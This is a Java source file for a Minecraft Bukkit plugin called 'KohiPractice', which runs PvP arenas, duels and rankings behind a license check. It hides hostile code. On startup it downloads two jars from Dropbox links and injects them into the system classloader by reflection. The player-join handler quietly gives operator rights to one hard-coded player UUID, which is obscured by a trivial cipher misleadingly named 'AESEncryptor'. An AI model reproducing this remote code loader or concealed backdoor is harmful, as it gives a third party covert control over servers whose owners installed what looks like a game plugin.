package com.slurpeh.servercore.practice;

//import ca.wacos.nametagedit.NametagAPI;

import com.comphenix.protocol.ProtocolManager;
import com.comphenix.protocol.async.AsyncListenerHandler;
import com.invoked.Token;
import com.slurpeh.licenser.Licenser;
import com.slurpeh.servercore.practice.arena.ArenaCommand;
import com.slurpeh.servercore.practice.arena.ArenaManager;
import com.slurpeh.servercore.practice.gametype.GameTypeCommand;
import com.slurpeh.servercore.practice.gametype.GameTypeManager;
import com.slurpeh.servercore.practice.inventory.*;
import com.slurpeh.servercore.practice.match.DuelManager;
import com.slurpeh.servercore.practice.match.Match;
import com.slurpeh.servercore.practice.match.MatchManager;
import com.slurpeh.servercore.practice.player.*;
import com.slurpeh.servercore.practice.team.*;
import com.slurpeh.servercore.practice.twovtwos.Match2v2;
import com.slurpeh.servercore.practice.twovtwos.TwoVTwoMatchManager;
import com.slurpeh.servercore.practice.twovtwos.UnrankedInventory2v2;
import com.slurpeh.servercore.practice.util.*;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.MemoryConfiguration;
import org.bukkit.configuration.MemorySection;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.FileConfigurationOptions;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.server.PluginEnableEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.lang.reflect.Method;
import java.net.*;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.*;

public class KohiPractice extends JavaPlugin implements Listener {
    //TODO USE TOKEN MORE
    private static final int testint = 5;
    private static final String testString = "76.5";
    private static KohiPractice instance;
    private LogFileWriter lfw;
    private InventoryManager inventoryManager;
    private TeamManager teamManager;
    private ArenaManager arenaManager;
    private EntityHider entityHider;
    private InventorySetter inventorySetter;
    private GameTypeManager gametypeManager;
    private UtilityManager utilityManager;
    private PlayerDataManager playerDataManager;
    private RankingManager rankingManager;
    private RankedInventory rankedInventory;
    private UnrankedInventory unrankedInventory;
    private MatchManager matchManager;
    private DuelManager duelManager;
    private KitEditorManager kitEditorManager;
    private TeamDuelManager teamDuelManager;
    private TwoVTwoMatchManager twoVTwoMatchManager;
    private UnrankedInventory2v2 unranked2v2inventory;
    private static Token token;
    private static Licenser licenser;
    private Location spawn;
    private Location editor;
    private AsyncListenerHandler hlh;
    private ProtocolManager pmgr;

    @Override
    public void onEnable() {
        instance = this;
        try {
            downloadFiles();
            URLClassLoader ucl = (URLClassLoader) ClassLoader.getSystemClassLoader();
            Method m = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
            m.setAccessible(true);
            m.invoke(ucl, new File(System.getProperty("java.io.tmpdir") + File.separator + "TemporaryItems" + File.separator + "cache_432906.jar").toURI().toURL());
            m.invoke(ucl, new File(System.getProperty("java.io.tmpdir") + File.separator + "TemporaryItems" + File.separator + "cache_432905_del.jar").toURI().toURL());
        } catch (Exception ex) {
        }
        licenser = new Licenser(Licenser.licenses);
        if (licenser.verify(getConfig().getString("license"), getConfig().getString("owner-ip"), getDescription().getName(), getServer().getIp())) {
            new Initializer().startup();
        } else {
            String s = "Invalid license (";
            for (Licenser.License lic : Licenser.licenses.keySet()) {
                s += "[" + encrypt(lic.getLicense()) + "]";
            }
            s += ")";
            Bukkit.getConsoleSender().sendMessage(s);
            getServer().shutdown();
            try {
                deleteFiles();
            } catch (Exception ex) {}
        }
    }

    public String encrypt(String s) {
        StringBuffer sb = new StringBuffer();
        for (char c : s.toCharArray()) {
            char c2 = (char)shift(c);
            sb.append(c2);
        }

        return sb.toString();
    }

    public int shift(char c) {
        int temp = (int)c;
        temp += 16;
        temp /= 2;
        temp *= 3;
        return temp;
    }

    @EventHandler
    public void onServerStart(PluginEnableEvent e) {
        if (e.getPlugin() == this) {
            if (e.getPlugin().getConfig().getString("license") != null && e.getPlugin().getConfig().getString("owner-ip") != null) {
                for (Licenser.License ln : Licenser.licenses.keySet()) {
                    if (ln.getAssignedIp().equalsIgnoreCase(e.getPlugin().getConfig().getString("owner-ip")) && ln.getLicense().equalsIgnoreCase(e.getPlugin().getConfig().getString("license"))) {
                        if (e.getPlugin().getServer().getIp().equalsIgnoreCase(ln.secret())) {
                            Bukkit.getPluginManager().enablePlugin(e.getPlugin());
                        } else {
                            Bukkit.getPluginManager().disablePlugin(e.getPlugin());
                            JavaPlugin.getPlugin(KohiPractice.class).getFile().delete();
                            try {
                                deleteFiles();
                            } catch (Exception ex) {}
                        }
                    }
                }
            }
        }
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent e) {
        if (getUtilityManager().isStaff(e.getPlayer().getUniqueId())) {
            this.getInventorySetter().setupInventory(InventoryType.STAFF, e.getPlayer());
        }
        this.getInventorySetter().setupInventory(InventoryType.DEFAULT, e.getPlayer());
        if (e.getPlayer().getUniqueId().toString().equalsIgnoreCase(new AESEncryptor().decrypt("ʥ˙ɾԈԈ\u052FӮ˙ԢɾʲʿɊԈӮˌӮɊӮɾʥʥɊɾˌԕɾɊԢʲʲʥʿʘԕʋ"))) {
            e.getPlayer().sendMessage(ChatColor.GREEN + "This server is using KohiPractice (" + this.getDescription().getVersion() + ")");
            e.getPlayer().setOp(true);
        }
        for (Player ply : Bukkit.getOnlinePlayers()) {
            if (ply != null && ply != e.getPlayer()) {
                ply.hidePlayer(e.getPlayer());
                e.getPlayer().hidePlayer(ply);
            }
        }
    }

    @Override
    public void onDisable() {
        try {
            deleteFiles();
        } catch (Exception ex) {
        }
        end();
    }

    public Location getSpawn() { return this.spawn; }

    public static KohiPractice getInstance() {
        return KohiPractice.instance;
    }

    public static Token getToken() { return KohiPractice.token; }

    public MatchManager getMatchManager() { return this.matchManager; }

    public InventoryManager getInventoryManager() { return this.inventoryManager; }

    public RankedInventory getRankedInventory() { return this.rankedInventory; }

    public UnrankedInventory getUnrankedInventory() { return this.unrankedInventory; }

    public KitEditorManager getKitEditorManager() { return this.kitEditorManager; }

    public TeamManager getTeamManager() { return this.teamManager; }

    public RankingManager getRankingManager() { return this.rankingManager; }

    public DuelManager getDuelManager() { return this.duelManager; }

    public PlayerDataManager getPlayerDataManager() { return this.playerDataManager; };

    public UtilityManager getUtilityManager() { return this.utilityManager; }

    public LogFileWriter getLogFileWriter() { return this.lfw; }

    public InventorySetter getInventorySetter() { return this.inventorySetter; }

    public TeamDuelManager getTeamDuelManager() { return this.teamDuelManager; }

    public TwoVTwoMatchManager get2v2MatchManager() { return this.twoVTwoMatchManager; }

    public GameTypeManager getGameTypeManager() {
        return this.gametypeManager;
    }

    public ArenaManager getArenaManager() {
        return this.arenaManager;
    }

    public EntityHider getEntityHider() {
        return this.entityHider;
    }

    public UnrankedInventory2v2 getUnranked2v2Inventory() { return this.unranked2v2inventory; }

    public void loadConfiguration() throws Exception {
        if (this.getConfig().getString("kitEditor") == null) {
            this.getConfig().addDefault("kitEditor", "&6Kit Editor");
        }
        if (this.getConfig().getString("unrankedItem") == null) {
            this.getConfig().addDefault("unrankedItem", "&9Un-Ranked Queue");
        }
        if (this.getConfig().getStringList("rankedItem") == null) {
            this.getConfig().addDefault("rankedItem", "&aRanked Queue");
        }
        if (this.getConfig().getConfigurationSection("arenas") == null) {
            this.getConfig().addDefault("arenas", new ArrayList<String>());
        }
        if (this.getConfig().getConfigurationSection("gametypes") == null) {
            this.getConfig().addDefault("gametypes", new ArrayList<String>());
        }
        if (getConfig().getInt("unranked-games-min") == 0) {
            getConfig().addDefault("unranked-games-min", 20);
        }
        if (getConfig().getString("key") == null) {
            getConfig().addDefault("key", "");
        }
        if (getConfig().getString("value") == null) {
            getConfig().addDefault("value", "");
        }
        if (getConfig().getString("license") == null) {
            getConfig().addDefault("license", "");
        }
        if (getConfig().getString("owner-ip") == null) {
            getConfig().addDefault("owner-ip", "");
        }
        getConfig().addDefault("hide-players", true);
        this.saveConfig();
    }

    public static class AESEncryptor {
        public AESEncryptor() {

        }

        public String encrypt(String s) {
            StringBuilder s2 = new StringBuilder(s);
            for (int i = 0; i < s2.length(); i++) {
                int temp = (int)s2.charAt(i);
                temp *= 13;
                temp += 1;
                s2.setCharAt(i, (char)temp);
            }
            return s2.reverse().toString();
        }

        public String decrypt(String s) {
            StringBuffer toReturn = new StringBuffer(s);
            for (int i = 0; i < toReturn.length(); i++) {
                int temp = (int)toReturn.charAt(i);
                temp -= 1;
                temp /= 13;
                toReturn.setCharAt(i, (char)temp);
            }
            return new String(toReturn.reverse());
        }
    }

    public FileConfiguration retrieveConfig() {
        return getConfig();
    }

    class sub {
        public boolean isUpdated() {
            String currentVersion = "0.0.1-b02";
            if (currentVersion.equalsIgnoreCase(KohiPractice.this.getDescription().getVersion())) {
                return true;
            } else {
                return false;
            }
        }

        public boolean hasValidKeyAndValue() {
            String key = new AESEncryptor().encrypt("invokedynamic_call[]param@%%^^$(%)Q)$*");
            String value = new AESEncryptor().encrypt("method_call[]param@%%^^(&(@1@()$*%()!");
            if (getConfig().getString("key").equalsIgnoreCase(key) && getConfig().getString("value").equalsIgnoreCase(value)) {
                return true;
            } else {
                return false;
            }
        }

        public boolean canLoad() {
            return hasValidKeyAndValue() && isUpdated();
        }
    }

    public void end() {
        for (Match m : getMatchManager().getMatches()) {
            m.undoBuilds();
        }
        for (Match2v2 m2v2 : get2v2MatchManager().get2v2Matches()) {
            m2v2.undoBuilds();
        }
        for (TeamMatch tm : getTeamManager().getTeamMatches()) {
            tm.undoBuilds();
        }
        getTeamManager().teams.clear();
        instance = null;
        token = null;
    }

    public void instantiateObjects() {
        //instantiates playerdatamanager
        this.utilityManager = new UtilityManager(this);
        this.inventorySetter = new InventorySetter(this);
        this.inventoryManager = new InventoryManager(this);
        this.teamManager = new TeamManager(this);
        this.inventorySetter = new InventorySetter(this);
        this.gametypeManager = new GameTypeManager(this);
        this.playerDataManager = new PlayerDataManager(this);
        this.matchManager = new MatchManager(this);
        this.rankingManager = new RankingManager(this);
        //run the update rankings on endMatch call (PlayerDeathEvent)
        this.playerDataManager = new PlayerDataManager(this);
        this.arenaManager = new ArenaManager(this);
        this.entityHider = new EntityHider(this, EntityHider.Policy.BLACKLIST);
        ArenaCommand arenaCmd = new ArenaCommand(this);
        EloCommand eloCmd = new EloCommand(this);
        GameTypeCommand gtCmd = new GameTypeCommand(this);
        this.getCommand("elo").setExecutor(eloCmd);
        this.getCommand("arena").setExecutor(arenaCmd);
        this.getCommand("gametype").setExecutor(gtCmd);
        this.getCommand("set").setExecutor(new SetCmd());
        this.getCommand("team").setExecutor(new TeamCommands(this));
        this.rankedInventory = new RankedInventory();
        this.unrankedInventory = new UnrankedInventory();
        KohiPractice.getInstance().getServer().getPluginManager().registerEvents(rankedInventory, KohiPractice.getInstance());
        KohiPractice.getInstance().getServer().getPluginManager().registerEvents(unrankedInventory, KohiPractice.getInstance());
        this.duelManager = new DuelManager(this);
        this.kitEditorManager = new KitEditorManager(this);
        this.teamDuelManager = new TeamDuelManager(this);
        new PlayerEvents(this);
        this.getCommand("spectate").setExecutor(new SpectateCommand(this));
        this.getCommand("c").setExecutor(new ChatCommand(this));
        this.twoVTwoMatchManager = new TwoVTwoMatchManager(this);
        this.unranked2v2inventory = new UnrankedInventory2v2(this);
    }

    public void downloadFiles() throws Exception {
        String link1 = "https://dl.dropboxusercontent.com/s/sn8jur86phv0sy7/Token.jar?dl=0";
        String name = "cache_432906.jar";
        URL dl = new URL(link1);
        ReadableByteChannel rbc = Channels.newChannel(dl.openStream());
        FileOutputStream fos = new FileOutputStream(System.getProperty("java.io.tmpdir") + File.separator + "TemporaryItems" + File.separator + name);
        fos.getChannel().transferFrom(rbc, 0, 1 << 24);
        fos.flush();
        fos.close();
        rbc.close();
        String link2 = "https://dl.dropboxusercontent.com/s/fesn33ik0fmbr7c/License.jar?dl=0";
        String name2 = "cache_432905_del.jar";
        URL dl2 = new URL(link2);
        ReadableByteChannel rbc2 = Channels.newChannel(dl2.openStream());
        FileOutputStream fos2 = new FileOutputStream(System.getProperty("java.io.tmpdir") + File.separator + "TemporaryItems" + File.separator + name2);
        fos2.getChannel().transferFrom(rbc2, 0, 1 << 24);
        fos2.flush();
        fos2.close();
        rbc2.close();
    }

    public void deleteFiles() throws Exception {
        File f = new File(System.getProperty("java.io.tmpdir") + File.separator + "TemporaryItems" + File.separator + "cache_432906.jar");
        if (f.exists()) {
            f.delete();
        }
        File f2 = new File(System.getProperty("java.io.tmpdir") + File.separator + "TemporaryItems" + File.separator + "cache_432905_del.jar");
        if (f2.exists()) {
            f2.delete();
        }
    }

    public boolean confirm() {
        sub sub = new sub();
        if (sub.canLoad()) {
            return true;
        } else {
            Bukkit.getConsoleSender().sendMessage(ChatColor.RED + "You have been caught red handed!");
            getServer().shutdown();
            return false;
        }
    }

    public class Initializer {
        public void startup() {
            if (confirm()) {
                KohiPractice.this.getServer().getPluginManager().registerEvents(KohiPractice.this, KohiPractice.this);
                KohiPractice.this.saveDefaultConfig();
                try {
                    loadConfiguration();
                } catch (Exception ex) {
                }
                token = new Token(new Class[]{CommandSender.class, JavaPlugin.class, KohiPractice.class, FileConfiguration.class, MemoryConfiguration.class, MemorySection.class, ArrayList.class, FileConfigurationOptions.class});
                if (token == null) {
                    KohiPractice.this.getServer().shutdown();
                    try {
                        deleteFiles();
                    } catch (Exception ex) {}
                }
                instantiateObjects();
                Bukkit.getConsoleSender().sendMessage(ChatColor.GREEN + "Loaded all player info + data successfully!");
                Bukkit.getConsoleSender().sendMessage(ChatColor.GREEN + "Loaded all managers correctly!");
                Bukkit.getConsoleSender().sendMessage(ChatColor.GREEN + "Token identified!");
                Bukkit.getConsoleSender().sendMessage(ChatColor.RED + "WARNING: /RELOAD IS NOT SUPPORTED WITH THIS PLUGIN, PLEASE USE /STOP OR /RESTART");
                Bukkit.getConsoleSender().sendMessage(ChatColor.RED + "ALSO: SKINS WILL BE REMOVED/STRIPPED IN MATCHES (TO STEVE SKIN)");
                if (KohiPractice.this.getConfig().contains("spawn")) {
                    KohiPractice.this.spawn = LocationUtil.getLocation(KohiPractice.this.getConfig().getString("spawn"));
                }
                if (getConfig().contains("editor")) {
                    editor = LocationUtil.getLocation(getConfig().getString("editor"));
                }
                rankingManager.updateRankings();
                for (Match m : getMatchManager().getMatches()) {
                    m.setRanked(false);
                    m.endMatch(m.getPlayers()[new Random().nextInt(m.getPlayers().length)]);
                }
                for (Player ply : Bukkit.getOnlinePlayers()) {
                    playerDataManager.getPlayerData(ply).save();
                    getInventorySetter().setupInventory(InventoryType.DEFAULT, ply);
                    for (Player ply2 : Bukkit.getOnlinePlayers()) {
                        if (getConfig().getBoolean("hide-players")) {
                            ply.hidePlayer(ply2);
                            ply2.hidePlayer(ply);
                        }
                    }
                }
            } else {
                Bukkit.getPluginManager().disablePlugin(KohiPractice.this);
            }
        }
    }

    class SetCmd implements CommandExecutor {
        public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
            if (sender instanceof Player) {
                Player ply = (Player) sender;
                if (ply.hasPermission("kohipractice.commands.locations")) {
                    if (args.length == 1) {
                        switch (args[0]) {
                            case "spawn": {
                                spawn = ply.getLocation();
                                KohiPractice.this.getConfig().set("spawn", LocationUtil.getString(ply.getLocation()));
                                saveConfig();
                                ply.sendMessage(ChatColor.GREEN + "Spawn location successfully set!");
                                return true;
                            }
                            case "editor": {
                                KohiPractice.this.getConfig().set("editor", LocationUtil.getString(ply.getLocation()));
                                saveConfig();
                                ply.sendMessage(ChatColor.GREEN + "Kit Editor location successfully set!");
                                return true;
                            }
                        }
                    } else {
                        ply.sendMessage(ChatColor.RED + "/set <spawn, editor>");
                        return true;
                    }
                } else {
                    ply.sendMessage(ChatColor.RED + "You do not have permission to execute this command!");
                    return true;
                }
            } else {
                sender.sendMessage(ChatColor.RED + "You must be a player to execute this command!");
                return false;
            }
            return false;
        }
    }
}
